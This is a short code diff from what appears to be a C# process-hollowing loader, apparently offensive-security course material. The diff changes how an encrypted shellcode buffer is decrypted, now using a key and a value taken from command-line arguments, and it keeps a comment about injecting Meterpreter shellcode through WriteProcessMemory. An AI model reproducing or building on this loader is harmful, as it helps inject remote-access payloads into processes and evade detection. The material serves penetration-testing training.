@@ -179,7 +179,7 @@ namespace ProcessHollowingExe
                 0x62,0x05
             };
 
-            buf = PFuncs.CaesarDecrypt(buf);
+            buf = PFuncs.CaesarDecrypt(buf, args[0], Convert.FromBase64String(args[1]));
 
             //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
             //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
